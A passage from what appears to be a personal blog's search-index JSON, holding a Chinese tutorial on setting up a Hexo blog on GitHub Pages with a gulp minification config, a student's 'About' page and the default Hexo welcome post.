#新建文章 hexo g == hexo generate #生成静态页面至public目录 hexo s == hexo server #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览） hexo d == hexo deploy #将.deploy目录部署到GitHub hexo g -d #生成加部署 hexo g -s #生成加预览   **注：**当本地预览和远程部署的浏览结果不同的时候，不妨使用hexo clean \u0026\u0026 hexo g -d试试。\n创建文章 命令：\n$ hexo new [layout] \u003ctitle\u003e 复制代码 参数说明：\n [layout]可以为以下三种：     参数名 功能 文章路径     post 新建博文 source/_posts   page 新建页面（如404，分类） source   draft 草稿 source/_drafts    草稿可通过一下命令发布：\n$ hexo publish [layout] \u003ctitle\u003e 复制代码   title注意：\n不是博文标题，\n是博文markdown文件的名字，\n也是博文链接的后缀（如https://www.simon96.online/2018/10/12/hexo-tutorial/中的hexo-tutorial）\n  文章模版   创建模版\n在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，例如：\n   $ hexo new blog \"simon\"\n ​\t在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 blog.md，并根据其内容建立文章。\n  修改参数\n以下是您可以在模版中使用的变量：\n     变量 描述     layout 布局   title 标题   date 文件建立日期    Front-matter 就是博文最上方以 --- 分隔的那部分。\n默认可以使用的Front-matter：\n   参数 描述 默认值     layout 布局    title 标题    date 建立日期 文件建立日期   updated 更新日期 文件更新日期   comments 开启文章的评论功能 true   tags 标签（不适用于分页）    categories 分类（不适用于分页）    permalink 覆盖文章网址     主题配置 hexo主题wiki\n可以在此处寻找自己喜欢的主题下载所有的主题文件，保存到Hexo目录下的themes文件夹下。然后在_config.yml文件中修改：\n# Extensions ## Plugins: http://hexo.io/plugins/ ## Themes: http://hexo.io/themes/ theme: landscape //themes文件夹中对应文件夹的名称 然后先执行hexo clean，然后重新hexo g，并且hexo d，很快就能看到新主题的效果了~\n主题优化   设置「RSS」\n  添加「标签」页面\n  添加「分类」页面\n  设置「字体」\n  设置「代码高亮主题」\n  侧边栏社交链接\n问题：图标哪里找？\n解决：Font Awesome\n  开启打赏功能\n问题：微信支付宝二维码不美观，规格不一。\n解决：在线生成二维码\n  设置友情链接\n  添加个人联系方式\n  腾讯公益404页面\n  站点建立时间\n  订阅微信公众号\n  设置「动画效果」\n问题：慢，需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 解决：将主题配置文件_config.yml中，use_motion字段的值设为 false 来关闭动画。\n  设置「背景动画」\n  添加背景图\n  修改Logo字体\n  修改内容区域的宽度\n  网站标题栏背景颜色\n  自定义鼠标样式\n  文章加密访问\n  实现点击出现桃心效果\n  静态资源压缩（博文压缩）\n  修改访问url路径\n  博文置顶\n  在右上角或左上角实现fork me on github\n  主页文章添加边框阴影效果\n  显示当前浏览记录\n  常见分类页\n  加入广告\n  添加萌萌哒\n  搜索功能\n  网易云外链播放器\n  花里胡哨的玩意儿\n  修改作者头像并旋转\n  修改``代码块自定义样式\n  点击爆炸效果\n  添加萌妹子动图\n  侧栏设置\n  透明背景设置\n  添加阅读全文\n  设置网站缩略图标\n  添加站点访问计数\n  前几个可参考next官方文档配置\n（以下用到外部工具）\n评论系统\n数据统计与分析\n内容分享服务\n文章加密访问\nhexo-blog-encrypt\nSEO Hexo NexT 主题SEO优化指南\nseo这东西是使自己的文章能被百度、谷歌搜录，能被搜索到。\n因为暂时不想被搜到/doge，所有暂不配置\nGitPage 国内优化 参考大佬的博客：https://blog.lgf.im/2020/03/speedup-github-page/#\n  对于html/js/css的压缩：gulp\n1 2 3 4 5 6 7 8 9 10 11  $ # 本机安装 $ npm install gulp -g $ #为了github Action 和其他CI\\CD平台也能进行安装，推荐 $ npm install gulp --save-dev $ # 安装依赖 $ npm install gulp-minify-css \\  gulp-babel \\  gulp-uglify \\  gulp-htmlmin \\  gulp-htmlclean \\  --save-dev    创建配置文件：在博客hexo的根目录下，新建 gulpfile.js 配置文件  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  var gulp = require('gulp'); var minifycss = require('gulp-minify-css'); var uglify = require('gulp-uglify'); var htmlmin = require('gulp-htmlmin'); var htmlclean = require('gulp-htmlclean'); var imagemin = require('gulp-imagemin'); // 压缩css文件 gulp.task('minify-css', function() { return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public')); }); // 压缩html gulp.task('minify-html', function() { return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin({ collapseWhitespace: true, collapseBooleanAttributes: true, removeComments: true, removeEmptyAttributes: true, removeScriptTypeAttributes: true, removeStyleLinkTypeAttributes: true, minifyJS: true, minifyCSS: true, minifyURLs: true, ignoreCustomFragments: [ /\\{\\{[\\s\\S]*?\\}\\}/ ], })) .pipe(gulp.dest('./public')); }); // 压缩js文件 gulp.task('minify-js', function() { return gulp.src(['./public/**/*.js','!./public/js/**/*min.js']) .pipe(uglify()) .pipe(gulp.dest('./public')); }); // 压缩图片 gulp.task('minify-images', function() { return gulp.src(['./public/**/*.png', './public/**/*.jpg', './public/**/*.gif', './public/**/*.svg']) .pipe(imagemin({ optimizationLevel: 5, //类型：Number 默认：3 取值范围：0-7（优化等级）  progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片  interlaced: false, //类型：Boolean 默认：false 隔行扫描gif进行渲染  multipass: false, //类型：Boolean 默认：false 多次优化svg直到完全优化  })) .pipe(gulp.dest('./public')); }); gulp.task('default', gulp.series(gulp.parallel('minify-html', 'minify-css', 'minify-js', 'minify-images')));   gulp 压缩完之后快了50%\n  cdn加速 我的博客还没应用，先mark一下，可以用jsDelivr进行CDN分发 jsDelivr 是一家开源免费CDN，主要是对npm包进行CDN分发 绝妙的是它还能对Github和Wordpress进行CDN分发 我们可以借助 jsDelivr 的 Github资源分发 服务来对我们博客中的css\\js\\小图片进行加速\n  加载时文字可见\n  使用懒加载\n   新增Page更改图标 hexo new page \"xxx\"\n然后在主题配置_config.yml中的menu项中这么写\nxxx: /xxx/ || to_icon to_icon为图标，图标可以在这找：https://fontawesome.com/\n","description":"","tags":["hexo"],"title":"hexo+gitpages","uri":"/posts/hexo-gitpages/"},{"categories":null,"content":"I wanna try everything You will see a different me Your browser does not support the audio element.   function play(){ var myVideo=document.getElementById(\"bgmusic\"); myVideo.volume=0.1; myVideo.play(); } window.onload=play;  About Me Hi，I'm Magic.\nI’m a student now.\nAccording to my name，you must know that I love magic very much.\nAnd I believe computer is also an art of magic. It's worthy to know more about computer.\nOn the other hand， I am also interesting in Game(especially FPS Game)，Sports(especially basketball)， Parkour， Movie and Piano Music.\nAnd I wanna try to know everything. The world is so Magic，isn't it ?\nAs for programming， I have learned java、python and some cpp.\nwhy i choose cyber security？ When many people talk about this, they may think it as hacker (really more as cracker).But that's one for me.Be a hacker, be free, to think deep.\nOn the other hand , that's what I ever read.A Hacker is more like an assassin as the Assassin's Creed.And my favorite : We walk in the darkness to serve the light.\nI think that's what white hat like.They work in the cyber where we couldn't see to secure our security.\nAbout this blog This blog is used to record my life and learning and some magic.\nIt is powered by Hexo and the theme is NexT, thanks to their developers.\nYou can find articles by categories and tags. You can subscribe my blog by RSS.\n .:okOOOkdc' 'cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: 'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO' oOOOOOOOO. .oOOOOoOOOOl. ,OOOOOOOOo dOOOOOOOO. .cOOOOOc. ,OOOOOOOOx lOOOOOOOO. ;d; ,OOOOOOOOl .OOOOOOOO. .; ; ,OOOOOOOO. cOOOOOOO. .OOc. 'oOO. ,OOOOOOOc oOOOOOO. .OOOO. :OOOO. ,OOOOOOo lOOOOO. .OOOO. :OOOO. ,OOOOOl ;OOOO' .OOOO. :OOOO. ;OOOO; .dOOo .OOOOocccxOOOO. xOOd. ,kOl .OOOOOOOOOOOOO. .dOk, :kk;.OOOOOOOOOOOOO.cOk: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . ","description":"","tags":null,"title":"about","uri":"/about/"},{"categories":null,"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start Create a new post 1  $ hexo new \"My New Post\"   More info: Writing\nRun server 1  $ hexo server   More info: Server\nGenerate static files 1  $ hexo generate   More info: Generating\nDeploy to remote sites 1  $ hexo deploy   More info: Deployment\n","description":"","tags":null,"title":"Hello World","uri":"/posts/hello-world/"}]
